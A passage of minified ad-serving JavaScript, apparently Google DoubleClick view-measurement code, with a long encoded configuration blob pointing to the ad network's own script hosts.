      null != a.C && (e.cstd = a.C);
      (b = T.bvst) && (e.cisv = b + ("." + a.U));
      0 !== a.K && (e.vwbs = a.K);
      a.G && (e.oprs = a.G);
      a.F && (e.opsd = a.F);
      (b = Zb(Pc).j) && (e.uach = b);
      e.arae = Number(Uc());
      var f = "";
      pb(e, function (g, h) {
        f += "&" + h + "=" + encodeURIComponent(g);
      });
      return eb(a.I, f);
    }
    function fd(a) {
      var b = a.P;
      if (b && (b = x["bllsn" + b], "function" === typeof b)) try {
        b(function (c) {
          c && (a.K = c.block ? 2 : 1);
        });
      } catch (c) {}
    }
    ;
    S().btrp = function (a, b) {
      var c = Yc = new Wc(a, b);
      return function (d) {
        Zc(c, d);
      };
    };
    S().pdib3 = function (a, b) {
      Yc.H.promise.then(function () {
        if (b) {
          var c = void 0 === c ? !1 : c;
          if (vb()) ub(window, a, null, !0, c);else {
            var d = x.document;
            if (d.body) {
              var e = d.getElementById("goog-srcless-iframe");
              e || (e = tb("IFRAME"), e.style.display = "none", e.id = "goog-srcless-iframe", d.body.appendChild(e));
              d = e;
            } else d = null;
            d && d.contentWindow && ub(d.contentWindow, a, null, !0, c);
          }
        } else U(a);
      });
    };
    S().vv = function () {
      var a = Zb(Pc);
      if (!a.h) throw Error("aiv::err");
      a.h();
    };
    S().sasrc = function (a) {
      Yc.H.promise.then(function () {
        var b = x.document.createElement("img");
        b.style.display = "none";
        b.attributionSrc = a;
        x.document.body.appendChild(b);
      });
    };
  }).call(this);
  window.stcc = btrp("https://googleads4.g.doubleclick.net/pcs/view?xai\x3dAKAOjsvx991rMSp2hDazo91NAaWlqp2XodEGCHyC2Em8uWJJjsy5uHRmuz9VHpQVqHt1EFRv_WQyHjbIBSDV8QCeKE-G-_UPPo6rklTag8MV_SlJBZiorhGAuTvr6FmolACshs980haMi5XSDeu4aiktqM8IhXLs1_3Lay5ImoeAWprpD3lGBoz6UvPKLYbdqSCA9h3ljy56atv9uJqJ352d9683ba2lwtWgR0G5WeimDzFaDJYPhTeBinthWHcBlOL3sCfDkMrOpeU7lMDPI0xNhALoCFZlyMqF031ax_Y2_XDBGII149YWj0ViPqRLAXET_zV3pRt01goD8XQWqjQZAchdgKgPqKtNSTXSvqGHeY3xLsnDd2CWyzLroMALc5HA-6dkH1BYYxjsesXckGlZsc6SazxXKDou2qqW4n9fqVU_HOMqdoA3HoNh-8LqcIlzI6KUdCgyIXlWdDhpUtxgDGK7XLAA_oxpSpHwNLCqp0G6lmiLjzwleOWJefkZbj3KqU6P3vYqEtKHYbkPYqq9RAWqeqXOAjRPje8ZypJMYpNN0x7o3Nl5a8bgTYS8gg0-3fHCkytKIk8ZsXQaQ6z2CfWNS5rIsjHEicvcZXcZbo8A-7hSnsDp0vzIVmUfeHRMZBn0uRbIdgD690yMuRzxfTE4OEmfg0FC8Yo106DmjS5bYVINsLxTj3SlsSmlowUfBvrOIfema2euIa8P4SRpDXpfpFMnJFyBaxsLfPa5T8h7awFiNWrorly5fypvdAavy9C8iW5w94HY8uzijn6ZnkPPStar4egkYJFJP1FClSzvsrikGaMNKjpu5BxMSvXkxAbFWfVYOKgCzPe3mSnf1CNix0UGcxsCUwU6YrQDBJJve-F4EHPrXHSbkhWPlnYfwmgiA2QRByNilVGSW_nTEVBxaeYDUuGYxtE01SaCowxp-PVsuCBxwhjEUlPNZiftorvwB8JUYyZW5H3vSFWahanrOnzV5hQc9GCXIsnOrO7kb2qugAC_-W3gVxQdd8FtKZ3q3KxhZH0-ddIRm0Sl7Hakf2pb000dc9NdgngG7NMu12Oktfuxf6S2RAk01lObBz6sWiF0_wKwZvL0RqsSQgovZEMo4Wis2wYDm79ZlJsm3EY1msTgIlzNsfT7LwojBzjgKu5rvE-50T1FyUVhUYjAM-2H5K8Q2E4zilvRTnKKRxp1TMNtZz6qw5XV7qs3k3e4Lrf08cLSj9-3rMaXET9sFwDvcVI6yX9CTaCkAsasZm8GnulbN5IGglBHRf1gIGoI5OOciFSdKehfUV9fOAWdeCdAwODJ5QWEtNBnQgCaQhllf7v_WKv6BdtEZU3wWamaayrHl_7SPA\x26sai\x3dAMfl-YS-aobWDyzweRNyt-TAGuO2lubEBYZhZpSS1UlU4ip6JfOpHNGxP5OjnoOPO_p6vEnzP4OrL5hk5bYf1s0bZe0w5-TYn-FC_5UCC1zPU-pW8Xn6oOISMQKFAZJFc0anE7112XMrUkenfH5FnTpQBIxM5ekPoyhs3w8JmF0qGnisj1RnNaV4mPsd22KDbqjKd6tQahR-zSGR7PFM3X6iBku6WUEFzdKOMNScpGO3zS4N7R5ZvCvo__iuShjFYRUWyhou\x26sig\x3dCg0ArKJSzBBO-Wy3jbgYEAE\x26uach_m\x3d[UACH]\x26fbs_aeid\x3d[gw_fbsaeid]\x26urlfix\x3d1\x26adurl\x3d", document.getElementById("gcc_jsrgZOS2Jvmw29gP0ZSnsAs"));
})();
(function () {
  if (!window.GoogleTyFxhY || typeof window.GoogleTyFxhY.push !== 'function') {
    window.GoogleTyFxhY = [];
  }
  window.GoogleTyFxhY.push({
    '_scs_': 'B42h9jsrgZOS2Jvmw29gP0ZSnsAsAAAAAOAHgBAI',
    '_bgu_': 'https://pagead2.googlesyndication.com/bg/VOYjWJ9SYKUWeq_SiXQPiq5A6-bg1q_inShFnttaRxg.js',
    '_bgp_': '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